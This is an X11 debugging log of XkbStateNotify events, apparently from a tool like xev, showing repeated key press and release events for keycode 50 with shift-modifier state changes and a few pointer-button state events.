XkbStateNotify event, serial 13, synthetic no, device 3, time 546894537,
    keycode 50, eventType KeyRelease,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00*, base= 0x00*, latched= 0x00, locked= 0x00
    grab mods= 0x00*, compat grab mods= 0x00*
    lookup mods= 0x00*, compat lookup mods= 0x00*
    compatState = 0x00*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546904720,
    keycode 1, eventType unknown,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00, base= 0x00, latched= 0x00, locked= 0x00
    grab mods= 0x00, compat grab mods= 0x00
    lookup mods= 0x00, compat lookup mods= 0x00
    compatState = 0x00, ptr_buttons= 0x0100*

XkbStateNotify event, serial 13, synthetic no, device 3, time 546904721,
    keycode 1, eventType unknown,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00, base= 0x00, latched= 0x00, locked= 0x00
    grab mods= 0x00, compat grab mods= 0x00
    lookup mods= 0x00, compat lookup mods= 0x00
    compatState = 0x00, ptr_buttons= 0x0100*

XkbStateNotify event, serial 13, synthetic no, device 3, time 546904721,
    keycode 1, eventType unknown,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00, base= 0x00, latched= 0x00, locked= 0x00
    grab mods= 0x00, compat grab mods= 0x00
    lookup mods= 0x00, compat lookup mods= 0x00
    compatState = 0x00, ptr_buttons= 0x0000*

XkbStateNotify event, serial 13, synthetic no, device 3, time 546904721,
    keycode 1, eventType unknown,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00, base= 0x00, latched= 0x00, locked= 0x00
    grab mods= 0x00, compat grab mods= 0x00
    lookup mods= 0x00, compat lookup mods= 0x00
    compatState = 0x00, ptr_buttons= 0x0000*

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905857,
    keycode 50, eventType KeyPress,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x01*, base= 0x01*, latched= 0x00, locked= 0x00
    grab mods= 0x01*, compat grab mods= 0x01*
    lookup mods= 0x01*, compat lookup mods= 0x01*
    compatState = 0x01*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905861,
    keycode 50, eventType KeyRelease,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00*, base= 0x00*, latched= 0x00, locked= 0x00
    grab mods= 0x00*, compat grab mods= 0x00*
    lookup mods= 0x00*, compat lookup mods= 0x00*
    compatState = 0x00*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905865,
    keycode 50, eventType KeyPress,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x01*, base= 0x01*, latched= 0x00, locked= 0x00
    grab mods= 0x01*, compat grab mods= 0x01*
    lookup mods= 0x01*, compat lookup mods= 0x01*
    compatState = 0x01*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905869,
    keycode 50, eventType KeyRelease,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00*, base= 0x00*, latched= 0x00, locked= 0x00
    grab mods= 0x00*, compat grab mods= 0x00*
    lookup mods= 0x00*, compat lookup mods= 0x00*
    compatState = 0x00*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905872,
    keycode 50, eventType KeyPress,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x01*, base= 0x01*, latched= 0x00, locked= 0x00
    grab mods= 0x01*, compat grab mods= 0x01*
    lookup mods= 0x01*, compat lookup mods= 0x01*
    compatState = 0x01*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905876,
    keycode 50, eventType KeyRelease,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00*, base= 0x00*, latched= 0x00, locked= 0x00
    grab mods= 0x00*, compat grab mods= 0x00*
    lookup mods= 0x00*, compat lookup mods= 0x00*
    compatState = 0x00*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905880,
    keycode 50, eventType KeyPress,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x01*, base= 0x01*, latched= 0x00, locked= 0x00
    grab mods= 0x01*, compat grab mods= 0x01*
    lookup mods= 0x01*, compat lookup mods= 0x01*
    compatState = 0x01*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905883,
    keycode 50, eventType KeyRelease,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00*, base= 0x00*, latched= 0x00, locked= 0x00
    grab mods= 0x00*, compat grab mods= 0x00*
    lookup mods= 0x00*, compat lookup mods= 0x00*
    compatState = 0x00*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905919,
    keycode 50, eventType KeyPress,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x01*, base= 0x01*, latched= 0x00, locked= 0x00
    grab mods= 0x01*, compat grab mods= 0x01*
    lookup mods= 0x01*, compat lookup mods= 0x01*
    compatState = 0x01*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905923,
    keycode 50, eventType KeyRelease,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00*, base= 0x00*, latched= 0x00, locked= 0x00
    grab mods= 0x00*, compat grab mods= 0x00*
    lookup mods= 0x00*, compat lookup mods= 0x00*
    compatState = 0x00*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905940,
    keycode 50, eventType KeyPress,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x01*, base= 0x01*, latched= 0x00, locked= 0x00
    grab mods= 0x01*, compat grab mods= 0x01*
    lookup mods= 0x01*, compat lookup mods= 0x01*
    compatState = 0x01*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905944,
    keycode 50, eventType KeyRelease,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00*, base= 0x00*, latched= 0x00, locked= 0x00
    grab mods= 0x00*, compat grab mods= 0x00*
    lookup mods= 0x00*, compat lookup mods= 0x00*
    compatState = 0x00*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546905993,
    keycode 50, eventType KeyPress,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x01*, base= 0x01*, latched= 0x00, locked= 0x00
    grab mods= 0x01*, compat grab mods= 0x01*
    lookup mods= 0x01*, compat lookup mods= 0x01*
    compatState = 0x01*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546906016,
    keycode 50, eventType KeyRelease,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00*, base= 0x00*, latched= 0x00, locked= 0x00
    grab mods= 0x00*, compat grab mods= 0x00*
    lookup mods= 0x00*, compat lookup mods= 0x00*
    compatState = 0x00*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546906047,
    keycode 50, eventType KeyPress,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x01*, base= 0x01*, latched= 0x00, locked= 0x00
    grab mods= 0x01*, compat grab mods= 0x01*
    lookup mods= 0x01*, compat lookup mods= 0x01*
    compatState = 0x01*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546906058,
    keycode 50, eventType KeyRelease,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00*, base= 0x00*, latched= 0x00, locked= 0x00
    grab mods= 0x00*, compat grab mods= 0x00*
    lookup mods= 0x00*, compat lookup mods= 0x00*
    compatState = 0x00*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546906119,
    keycode 50, eventType KeyPress,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x01*, base= 0x01*, latched= 0x00, locked= 0x00
    grab mods= 0x01*, compat grab mods= 0x01*
    lookup mods= 0x01*, compat lookup mods= 0x01*
    compatState = 0x01*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546906123,
    keycode 50, eventType KeyRelease,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00*, base= 0x00*, latched= 0x00, locked= 0x00
    grab mods= 0x00*, compat grab mods= 0x00*
    lookup mods= 0x00*, compat lookup mods= 0x00*
    compatState = 0x00*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546906155,
    keycode 50, eventType KeyPress,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x01*, base= 0x01*, latched= 0x00, locked= 0x00
    grab mods= 0x01*, compat grab mods= 0x01*
    lookup mods= 0x01*, compat lookup mods= 0x01*
    compatState = 0x01*, ptr_buttons= 0x0000

XkbStateNotify event, serial 13, synthetic no, device 3, time 546906158,
    keycode 50, eventType KeyRelease,
    group= 0, base= 0, latched= 0, locked= 0,
    mods= 0x00*, base= 0x00*, latched= 0x00, locked= 0x00
    grab mods= 0x00*, compat grab mods= 0x00*
    lookup mods= 0x00*, compat lookup mods= 0x00*
    compatState = 0x00*, ptr_buttons= 0x0000
```